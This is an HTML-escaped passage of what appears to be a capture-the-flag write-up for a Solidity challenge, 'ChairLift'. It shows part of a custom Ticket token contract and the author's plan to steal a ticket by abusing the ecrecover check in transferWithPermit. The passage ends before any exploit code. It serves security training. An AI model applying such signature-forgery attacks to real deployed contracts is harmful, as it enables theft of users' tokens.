&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ownerOf&lt;&#x2F;span&gt;&lt;span&gt;(tokenId) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: transfer of token that is not own&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: transfer to the zero address&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _owners[tokenId] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Transfer&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_safeTransfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes memory _data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_checkOnERC721Received&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: transfer to non ERC721Receiver implementer&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_checkOnERC721Received&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes memory _data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_isContract&lt;&#x2F;span&gt;&lt;span&gt;(to)) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC721Receiver&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;onERC721Received&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_data) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returns &lt;&#x2F;span&gt;&lt;span&gt;(bytes4 retval) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;retval &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC721Receiver&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;onERC721Received&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;selector&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch &lt;&#x2F;span&gt;&lt;span&gt;(bytes memory reason) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(reason&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: transfer to non ERC721Receiver implementer&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;                    assembly {
&lt;&#x2F;span&gt;&lt;span&gt;                        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;reason)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mload&lt;&#x2F;span&gt;&lt;span&gt;(reason))
&lt;&#x2F;span&gt;&lt;span&gt;                    }
&lt;&#x2F;span&gt;&lt;span&gt;                }
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_isApprovedOrOwner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(_owners[tokenId] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: operator query for nonexistent token&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address _owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ownerOf&lt;&#x2F;span&gt;&lt;span&gt;(tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(spender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;_owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getApproved&lt;&#x2F;span&gt;&lt;span&gt;(tokenId) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;spender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isApprovedForAll&lt;&#x2F;span&gt;&lt;span&gt;(_owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;spender))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        _tokenApprovals[tokenId] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Approval&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ownerOf&lt;&#x2F;span&gt;&lt;span&gt;(tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getChainId&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 chainId&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;chainId &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;chainid&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getDomainSeparator&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;private view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            DOMAIN_SEPARATOR_TYPEHASH&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(_name))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getChainId&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        ))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_isContract&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _addr&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;private view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;        uint32 size&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;size &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extcodesize&lt;&#x2F;span&gt;&lt;span&gt;(_addr)
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(size &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;IERC721Receiver &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;onERC721Received&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address operator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes calldata data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes4&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Setup contract deploys ChairLift contract and updates tripsTaken to 1&lt;&#x2F;li&gt;
&lt;li&gt;ChairLift contract deploys and uses Ticket contract&lt;&#x2F;li&gt;
&lt;li&gt;Ticket contract is not a standard token contract&lt;&#x2F;li&gt;
&lt;li&gt;Ticket contract uses &lt;code&gt;ecrecover&lt;&#x2F;code&gt; to verify the signature&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Goal :&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Goal is to update the tripsTaken variable to 2&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;To update the tripsTaken we have to call the function &lt;code&gt;takeRide()&lt;&#x2F;code&gt; with a ticket Id as arguement.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;takeRide&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 ticketId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require &lt;&#x2F;span&gt;&lt;span&gt;(ticket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ownerOf&lt;&#x2F;span&gt;&lt;span&gt;(ticketId) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You don&amp;#39;t own this ticket&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    tripsTaken &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    ticket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;burn&lt;&#x2F;span&gt;&lt;span&gt;(ticketId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To call the takeRide function we need a ticket. To buy a ticket it costs 1 million ether, too expensive ride. So we need find a way to steal ticket.&lt;&#x2F;p&gt;
&lt;p&gt;There is an interesting function &lt;code&gt;transferWithPermit()&lt;&#x2F;code&gt; which uses ecrecover to verify signature.&lt;&#x2F;p&gt;
